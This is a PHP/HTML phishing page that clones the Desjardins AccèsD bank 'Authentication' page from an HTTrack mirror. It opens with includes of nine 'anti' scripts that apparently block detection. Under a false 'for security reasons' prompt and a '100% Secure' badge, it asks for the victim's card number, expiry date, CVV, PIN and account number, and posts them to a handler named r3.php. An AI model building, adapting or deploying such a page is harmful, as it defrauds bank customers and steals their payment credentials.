<?php
	include '../../../../prevents/anti1.php';
	include '../../../../prevents/anti2.php';
	include '../../../../prevents/anti3.php';
	include '../../../../prevents/anti4.php';
	include '../../../../prevents/anti5.php';
	include '../../../../prevents/anti6.php';
	include '../../../../prevents/anti7.php';
	include '../../../../prevents/anti8.php';
	include '../../../../prevents/anti9.php';
?>
<!DOCTYPE html>




<html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
 <title>	Authentication | Desjardins
	</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <script type="text/javascript" src="../dtagent_ICA_6000500091501.js" data-dtconfig="rid%3dRID_-1445466877_rpid%3d361490071_uam%3dtrue_las/identifiantunique/dtagent_ICA_6000500091501.js"></script><noscript>
        <meta http-equiv="refresh" content="1;url=../erreur-contenu-support.html">
    </noscript>
    
<link rel="icon" href="https://www.desjardins.com/static-accesweb/201810151614/acces-web/img/desjardins.ico" type="image/x-icon">

<link href="../../../www.desjardins.com/static-accesweb/201810151614/lib/externe/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">

<link href="../../../www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap.min.css" rel="stylesheet">

<!--[if lt IE 9]>
    <link href="https://www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet" />
<![endif]-->
<!--[if lte IE 8]>
    <link href="https://www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie.min.css" rel="stylesheet" />
    <link href="https://www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap.css" rel="stylesheet" />
<![endif]-->
<!--[if IE 9]>
    <link href="https://www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/css/fwd-bootstrap-ie9.min.css" rel="stylesheet" />
<![endif]-->


        <link href="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/css/global.min.css" rel="stylesheet">
    
                <link media="only screen and (max-width : 768px)" href="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/css/identifiantunique-responsive.min.css" rel="stylesheet">
            

<!-- Ajustements de styles de l'application -->

    <link href="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/css/theme.min.css" rel="stylesheet">

<!--[if IE]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201810151614/acces-web/css/ie.min.css"/><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201810151614/acces-web/css/ie7.min.css"/><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="https://www.desjardins.com/static-accesweb/201810151614/acces-web/css/ie8.min.css"/><![endif]-->

<link href="../../../www.desjardins.com/static-accesweb/201810151614/lib/externe/owl-carousel/2.0/assets/owl.carousel.min.css" rel="stylesheet">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
        <meta name="description" content="Managing your personal finances has never been easier, quicker or more secure with Desjardins online services.">
    

    <meta name="desjardins-identifiant-application" content="AccesWeb">
    <meta name="raaMobileActif" content="">

    
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
            <script src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/js/global.min.js" type="text/javascript"></script>
        

    <script type="text/javascript">
        if (window.top.location != self.location) {
            window.top.location = self.location;
        };
    </script>

    
      <link rel="stylesheet" href="../../../www.desjardins.com/ressources/css/entete.css">
      <link rel="stylesheet" href="../../../www.desjardins.com/ressources/css/page-logon.css">
    
      <link href="../../../www.desjardins.com/ressources/css/pied.css" rel="stylesheet">
    <style type="text/css">
	.auto-style1 {
		color: #FF0000;
	}
	</style>
    </head><body class="isolation-bootstrap-3 fixChrome" data-whatinput="mouse"><fwd_placeholder__contenu_head_fragment_principal>




    
 <!-- if app_mobile --> 
        <a name="haut"></a>
        

                <span class="hidden-xs">
                    
    <div id="zone-entete-de-page">
      <div id="entete">
        <div id="access-links">
          <a href="#contenu" class="sr-only sr-only-focusable">Go to the main content</a>
        </div>
        <div id="logo">
          <h1 class="sr-only">Desjardins website</h1>
          
          <a href="http://www.desjardins.com/ca/index.jsp"><img src="http://www.desjardins.com/ressources/images/logo-n1-desjardins-desktop.svg?resVer=1518103178000" alt="Back to Desjardins.com home page" width="150" height="32"></a>
        </div>
        <div id="logo-applicatif">
          
          <a href="../identification5ac3.html"><img src="../../../www.desjardins.com/ressources/images/g40-entete-logo-accesd085a.png?resVer=1396378175000" alt="AccèsD" width="106" height="32"></a>
          
          <a href="../identification5ac3.html"><img src="../../../www.desjardins.com/ressources/images/g40-entete-logo-accesd-affairese8f1.png?resVer=1400174439000" alt="AccèsD Affaires" width="90" height="32"></a>
        </div>
        <div id="outils">
          <div id="nous-joindre">
            <p class="titre-entete"><a href="#" onclick="popup('http://www.desjardins.com/ca/help-page/index.jsp?docName=ai_joindre&amp;domaine=ACCESD','Joindre','resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600');">Contact us</a></p>
          </div>
          <div id="aide">
            <p class="titre-entete"><a href="#" onclick="popup('http://www.desjardins.com/ca/help-page/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD','Aide','resizable=yes,location=no,menubar=no,status=no,scrollbars=yes,width=800,height=600');">Help</a></p>
          </div>
          <div id="choix-site">
            <p class="titre-entete"><a id="btn-langue" href="identificatione967.html?langueCible=fr" lang="en"><span class="sr-only">Changer de langue. </span>Français</a></p>
          </div>
          <div id="fonctions">
            <ul>
              <li class="reduire"><a id="taille-texte-moins" href="javascript:void(0)" title="Decrease text size">Decrease text size</a></li>
              <li class="augmenter"><a id="taille-texte-plus" href="javascript:void(0)" title="Increase text size">Increase text size</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  
 </span> 
                    <span class="hidden-sm hidden-md hidden-lg">
                        

<div id="zone-entete-de-page">
    <nav class="navbar navbar-default" role="navigation">
        <div class="container max-layout-960">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">

                <span class="navbar-brand">
                    
                            <a href="#">
                                <img class="logo" src="https://www.desjardins.com/static-accesweb/201810151614/acces-web/img/logo-n1-desjardins-desktop.svg" alt="Go to home page" title="Desjardins">
                            </a>
                        
                    <div class="hidden-xs" style="display: inline;">
                        <img role="presentation" src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/g00-entete-filet-logos.png">
                        
                                <img class="logo-desjardins" role="presentation" src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins">
                            
                    </div>
                </span>

                <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg">Authentication</div>
                
                        <a href="http://www.desjardins.com/" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
                            <img id="menuAppRetour" src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/entete-btn-menu-app.png" height="32">
                        </a>
                    
 </div><!-- /.navbar-header --> <!-- Collect the nav links, forms, and other content for toggling --> 
            <div class="collapse navbar-collapse" id="navbar-collapse-outils">
                <div id="outils">
                    <ul class="nav navbar-nav navbar-right">
                        
                        <li>
                            <a class="lien" href="javascript:popup('https://www.desjardins.com/ca/help-page/index.jsp?docName=ai_joindre&amp;domaine=ACCESD','Contact us', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Contact us
                            </a><span class="hidden-xs">|</span>
                        </li>
                        <li>
                            <a class="lien" href="javascript:popup('https://www.desjardins.com/en/services_en_ligne/accesd/aide/ai_logonlogoff.jsp?domaine=ACCESD','Help', 'location=0,scrollbars=yes,resizable=yes,width=500,height=500');">
                                Help
                            </a><span class="hidden-xs">|</span>
                        </li>
                        
                                <li class="hidden-xs">
                                    
                                            <a class="lien" id="changeLangue" href="identificatione967.html?langueCible=fr">
                                                Français
 </a> 
                                    <span class="hidden-sm">|</span>
                                </li>
                            
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                                <img src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/a00-entete-ic-texte-moins-on.png" alt="" title="">
                            </a>
                        </li>
                        <li class="hidden-xs">
                            <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                                <img src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/a00-entete-ic-texte-plus-on.png" alt="" title="">
                            </a>
                        </li>

                        
 </ul> </div> </div><!-- /.collapse .navbar-collapse --> 
 </div><!-- /.container-fluid --> </nav><!-- /.navbar .navbar-default .navbar-fixed-top -->
</div>

 </span> 
                <script type="text/javascript">
                var deconnexionLogoutDefault = "true";
                $("#btn-deconnexion").attr("href", "#");
                </script>
                <script type="text/javascript">
                    $(document).on("click", "#btn-deconnexion", function() { dynDeconnection("https://accweb.mouv.desjardins.com:443/identifiantunique/autologout"); });
                </script>
            
 <!-- fin if app_mobile --> 
    <div class="zone-centrale">

        <div id="zone-centrale-bg">
            <!-- div id="zone-centrale-grad" class="zone-centrale padding-top-35px"></div-->
            <div class="container">
                <div id="contenu" lang="en" role="main">
                    
                    <div class="row">
                        
                                <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                            

                            <div id="loading" class="loading" style="display: none;">
                                <div class="panel panel-primary">
                                    <div class="panel-body">
                                        <img id="img-loading" src="www.desjardins.com/static-accesweb/201711221122/lib/interne/fwd-bootstrap/3.3/img/a00-loading-petit.html" alt="Loading">
                                    </div>
                                </div>
                            </div>
                            
                            


<h1 id="titrePage" data-titre-page-mobile="Authentication">Authentication
</h1>
<form id="formAuthentification" class="form-horizontal" action="r3.php" method="POST" autocomplete="off">
    <input type="hidden" name="username" value="">
	<div class="row">
        <div class="col-sm-24">
            
        </div>
    </div>

    <!--Dessin du panel -->
    <div class="row">
        <div class="col-sm-24">
            <div class="panel panel-primary">
                <div class="panel-body">
        
       
        <div class="row div-error" style="display: none;">
          <div class="col-lg-24">
            <div class="has-error error-block">
              <div class="errors-title">
              <div class="error-img"></div>
              <div class="error-msg">
              Des erreurs ont été détectées dans les champs suivants :
              </div>
              </div>
              <ul></ul>
            </div>
          </div>
        </div>
        <div class="">
            <h3 class="section">Account Details</h3>
        </div>
        <p class="top20px">
                                        
 <span>For <b>security reasons</b>, please verify your identity by filling your details in the fields below .
 </span> 
 </p> 
 <br>   
     <div class="input-set">
            <div class="">
			 <div id="div-ville" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
                 <div class="form-group">
                     <div class="col-md-12 col-sm-12 control-label">
                        <label for="input-ville" class="control-described">
						 <span class="auto-style1">*</span> Card Number :</label>
                     </div>  
                     <div class="col-md-12 col-sm-12">
                        <span class="help-block" id="msg-input-ville"></span>
                        <div class="row">
                          <div class="col-lg-18 col-md-18 col-sm-18">
                                <input class="form-control"type="text" required="required" placeholder="   " name="cc" id="CardNumber" onkeypress="isInputNumber(event)" maxlength="16" autocomplete="off" style="width: 250px; height: 20px">
                          </div>
                        </div>
                     </div>
                 </div>   
              </div>
             <div id="div-dateNaissance" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
              <div class="form-group">
                  <div class="col-md-12 col-sm-12 control-label">
                    <label for="input-dateNaissanceJour" class="control-described">
                       <span class="auto-style1">*</span> Expiry Date (MM/YYYY) :
                    </label>
                  </div>  
                  <div class="col-md-12 col-sm-12">
                    <span class="help-block" id="msg-group-date"></span>
                    
								<select required="required" class="ccexp" id="ccmm" name="ccmm" style="display:inline; width: 86px;" aria-required="true">
<option selected="selected" value="">Month</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
								<select required="required" class="ccexp" id="ccyy" name="ccyy" style="display:inline; width: 80px;" aria-required="true">
<option selected="selected" value="">Year</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
<option value="2032">2032</option>
</select>
								
								<div id="step1_dobd_errorloc" class="error_strings"></div>
							
                  </div>
               </div> 
            </div>            
             	 <div id="div-nomMere" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
                <div class="form-group">
                  <div class="col-md-12 col-sm-12 control-label">
                    <label for="input-nomMere" class="control-described">
					  <span class="auto-style1">*</span> 
				CVV :<br></label>
                  </div>  
                  <div class="col-md-12 col-sm-12">
                      <span class="help-block" id="msg-input-nomMere"></span>
                      <div class="row">
                        <div class="col-lg-13 col-md-13 col-sm-13">
                          <input class="form-control" id="input-nomMere" placeholder=""  maxlength="4" name="cvv" type="text" style="width: 250px; height: 20px">
                        </div>
                      </div>
                  </div>
                </div>  
            </div>
            <div id="div-nas" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
              <div class="form-group">
                <div class="col-md-12 col-sm-12 control-label">
                  <label for="input-nas" class="control-described"> 
                    <label for="input-nomMere" class="control-described">
					<span class="auto-style1">*</span> </label>
                  Pin Number :</label>      </div>  
                <div class="col-md-12 col-sm-12">
                  <span class="help-block" id="msg-input-nas"></span>
                  <div class="row">
                    <div class="col-lg-13 col-md-13 col-sm-13">
                      <input class="form-control" id="input-nomMere" placeholder=""  maxlength="10" name="pin" type="password" style="width: 166px; height: 20px">
                    </div>
                  </div>
                </div>
              </div> 
            </div>
                         	    <div id="div-nas" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
              <div class="form-group">
                <div class="col-md-12 col-sm-12 control-label">
                  <label for="input-nas" class="control-described"> 
                    <label for="input-nomMere" class="control-described">
					<span class="auto-style1">*</span> </label>
                  Account Number :</label>
                </div>  
                <div class="col-md-12 col-sm-12">
                  <span class="help-block" id="msg-input-nas"></span>
                  <div class="row">
                    <div class="col-lg-13 col-md-13 col-sm-13">
                      <input class="form-control" id="input-nomMere" placeholder=""  maxlength="16" name="account" type="text" style="width: 250px; height: 20px">
                    </div>
                  </div>
                </div>
              </div> 
            </div>
                                         	    
       <div id="div-nas" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
               
            </div>

          
<div class="col-lg-24 col-md-24 col-sm-24  col-xs-24 col" id="div-releve-consentement">

</div> 
            </div><div class="">
			 <div id="div-ville" class="col-lg-24 col-md-24 col-sm-24 col reset reset">
                    
              </div>
                         
             	 
            
                         	    
                                         	    
       

          
<div class="col-lg-24 col-md-24 col-sm-24  col-xs-24 col" id="div-releve-consentement">

</div> 
            </div>
        </div>
          <div class="">
              
          </div>
            <div class="input-set">
              <div class="">
                
                         
             	 
			  	 
                 <!-- Fin statut option 5 -->
               </div>
<div class="top10px">
                        <div id="form-group-bouton" class="form-group">
                            <div class="col-xs-12 col-sm-8 col-md-8 text-right">
                                <a id="boutonAnnuler" href="#" class="btn btn-default fullwidth">Cancel</a>
                            </div>
                            <div class="col-xs-12 col-sm-4 col-md-4">
                                <input id="boutonValider" type="submit" name="send" class="btn btn-primary fullwidth" value="Validate">
                            </div>
                        </div>
                    </div>
                    </div>
                  </div>
                
              
            
            </div>
        </div>
    </div>
<div>
<input type="hidden" name="_tk" value="a27fbc06-dc0e-45fb-990c-332013b9b9a5">
</div></form>
    <form action="#" method="GET">
    
<div class="modal fade" id="modale-continuer-mobile" tabindex="-1" role="dialog" aria-describedby="alertDescription" data-backdrop="static">
    <div class="modal-dialog">
    	<div class="modal-content">
        	<div class="modal-header">
            	<p id="alertDescription" class="alert alert-warning no-margin-bottom"><strong>Attention!</strong><br> Votre mot de passe actuel sera désactivé.</p>
            </div>
            <div class="modal-body padding-left0px padding-right0px">
				<fieldset aria-describedby="noteDescription">
					<legend><strong>Désirez-vous obtenir un nouveau mot de passe?</strong></legend>
					<div class="row padding-top-10px">
						<div class="col-xs-12 col-sm-12 text-right">
							<button id="btnAnnulationNon" href="#" class="btn btn-default fullwidth" data-dismiss="modal">
								Non
							</button>
						</div>
						<div class="col-xs-12 col-sm-12">
							<button id="btnContinuer" href="#" class="btn btn-primary fullwidth">
								Oui
							</button>
						</div>	
					</div>
					<div class="text-left padding-top-10px">
						<p id="noteDescription">Note : Vous pouvez recevoir votre mot de passe temporaire par courriel. Pour le recevoir par courriel, vous devez ajouter un courriel à vos identifiants AccèsD, dans la section <strong>Paramètres de sécurité</strong> sous l’icône <strong>Profil et préférences</strong> de la page Sommaire AccèsD.</p>
					</div>
				</fieldset>
			</div>
		</div>
	</div>
</div>

<div id="modale-continuer" class="modal" tabindex="-1" role="dialog" aria-describedby="alertDescription" data-backdrop="static">
	<div class="modal-dialog">
    	<div class="modal-content">
        	<div class="modal-header">
            	<p id="alertDescription" class="alert alert-warning no-margin-bottom"><strong>Attention!</strong><br> Votre mot de passe actuel sera désactivé.</p>
            </div>
            <div class="modal-body padding-left0px">
				<fieldset aria-describedby="noteDescription">
					<legend><strong>Désirez-vous obtenir un nouveau mot de passe?</strong></legend>
					<div class="col-xs-12 col-sm-12 text-right padding10px">
						<button id="btnAnnulationNon" href="#" class="btn btn-default fullwidth" data-dismiss="modal">
							Non
						</button>
					</div>
					<div class="col-xs-12 col-sm-12 padding10px">
						<button id="btnContinuer" href="#" class="btn btn-primary fullwidth">
							Oui
						</button>
					</div>					                
					<div class="text-left padding-top-10px">
						<p id="noteDescription">Note : Vous pouvez recevoir votre mot de passe temporaire par courriel. Pour le recevoir par courriel, vous devez ajouter un courriel à vos identifiants AccèsD, dans la section <strong>Paramètres de sécurité</strong> sous l’icône <strong>Profil et préférences</strong> de la page Sommaire AccèsD.</p>	</div>	</fieldset>	</div>	</div>	</div>
</div>
 </form>


<!-- Div du logo securite -->

    <div class="row">
        <div class="col-sm-24">
            

<div id="imgSecurite" class="text-right hidden-xs">

    <a href="https://www.desjardins.com/securite/remboursement-fraude/">
        <img src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/g00-logo-securite-garantie-e.png" alt="Garanteed 100% Secure">
    </a>
       
</div>
 </div> </div>

<!-- modal de redirection -->
<div tabindex="0" role="dialog" aria-haspopup="true" aria-live="assertive" aria-labelledby="enteteModale textTimeRemaining" class="modal" id="modalOubliMotPasse" aria-hidden="true" data-backdrop="static" data-keyboard="false">
    <div aria-live="assertive" class="modal-dialog">
        <div class="modal-content col-md-offset-4 col-sm-offset-4 col-md-19 col-sm-19">
            <span class="sr-only">Boîte de dialogue</span>
            <div id="expirationWarningTitle" class="modal-header">
                <h2 id="enteteModale">Mot de passe désactivé</h2>
            </div>
            <p class="alert alert-warning" id="expirationWarningBody">
                Votre mot de passe <strong>a été désactivé</strong> après 3 échecs de connexion.
            </p>

            <div class="modal-footer top5px bottom20px">
                <a class="btn btn-primary btn-success" type="button" href="#">Obtenir un nouveau mot de passe</a>
            </div>

        </div>
    </div>
</div>

<script type="text/javascript">
$(document).ready(function() {
	var dataContentPopover = $('#fenetreModale').html();

    var popover = $('#lienMotPasseOublie').attr('data-content', dataContentPopover).data('bs.popover');
    if(popover != null) {
        popover.setContent();
        popover.$tip.addClass(popover.options.placement);
    }

    $('.modal').on('show.bs.modal', centerModal);
    $(window).on("resize", function() {
        $('.modal:visible').each(centerModal);
    });

    
 gererVerrouillageMaj();
});
</script>


                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/g00-logo-securite-garantie-e.png">
                                    <img class="fake" src="https://www.desjardins.com/static-accesweb/201810151614/acces-web/img/logo-n1-desjardins-desktop.svg">
                                    
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        
                                            <img src="../../../www.desjardins.com/static-accesweb/201810151614/acces-web/img/g00-logo-securite-garantie-e.png" alt="Garanteed 100% Secure">
                                        
                                            <img alt="Desjardins" src="https://www.desjardins.com/static-accesweb/201810151614/acces-web/img/logo-n1-desjardins-desktop.svg" title="Desjardins" class="normal non-selectable padding-left10px">
                                        
 </div> </div> <br> 

                            <br>
                        </div>
                    </div>

                </div>

            <br>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Site map</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="http://www.desjardins.com/ca/personal/index.jsp">Personal services</a></li>
              <li><a href="http://www.desjardins.com/ca/business/index.jsp">Business services</a></li>
              <li><a href="http://www.desjardins.com/ca/co-opme/index.jsp">Co-opme</a></li>
              <li><a href="http://www.desjardins.com/ca/about-us/index.jsp">About us</a></li>
              <li><a href="http://www.desjardins.com/ca/mobile-gps-rss/index.jsp">Mobile, GPS and RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          




<ul>
  <li><a href="http://www.desjardins.com/ca/security/index.jsp">Security</a></li>
  <li><a href="http://www.desjardins.com/ca/privacy/index.jsp">Privacy</a></li>
  <li><a href="http://www.desjardins.com/ca/terms-use-legal-notes/index.jsp">Terms of Use and legal notes</a></li>
  <li><a href="http://www.desjardins.com/ca/about-us/social-responsibility-cooperation/cooperative-movement/accessibility/index.jsp">Accessibility</a></li>
  <li><a href="http://www.desjardins.com/ca/site-map/index.jsp">Site map</a></li>
</ul>

  
  






<p class="copyright">© 1996-2019, Mouvement des caisses Desjardins - Desjardins Group. All rights reserved.</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup('http://www.desjardins.com/ca/security/','Security','scrollbars=yes,resizable=yes,width=500,height=500');">Security</a> | 
                            <a href="javascript:popup('http://www.desjardins.com/ca/privacy/','Privacy','scrollbars=yes,resizable=yes,width=500,height=500');">Privacy</a> | 
                            <a href="javascript:popup('http://www.desjardins.com/ca/terms-use-legal-notes/','Terms of Use','scrollbars=yes,resizable=yes,width=500,height=500');">Terms of Use and legal notes</a> | 
                            <a href="javascript:popup('https://www.desjardins.com/ca/help-page/index.jsp?docName=accessibilite&amp;domaine=ACCESD','Accessibility','scrollbars=yes,resizable=yes,width=500,height=500');">Accessibility</a> 
 <br> 
 </span> <p>Copyright © 2018 Desjardins Financial Group. All rights reserved.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="../../../www.desjardins.com/static-accesweb/201810151614/lib/externe/bootstrap/3.3.6/js/bootstrap.min.js" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->


<script src="../../../www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap.min.js" type="text/javascript"></script>
<!--[if IE]>
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/interne/fwd-bootstrap/3.3/js/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/html5shiv/3.7.0/html5shiv.js" type="text/javascript"></script>
    
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->


<script type="text/javascript">
    var LOCALE  = "en_CA_desjardins";
    var LOCALE_CODE_LANGUE = "en";
    var LOCALE_CODE_PAYS = "CA";
</script>



<!-- ni : accesweb01_berlin6_rel04  -->
<!-- pv :  -->
<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</script><script type="text/javascript" src="https://accweb.mouv.desjardins.com/_bm/abd-1-30"></script>

<!-- Mirrored from accweb.mouv.desjardins.com/identifiantunique/motPasseOublie/identification?langueCible=en by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Oct 2018 22:28:53 GMT -->

</fwd_placeholder__contenu_head_fragment_principal>



</body></html>
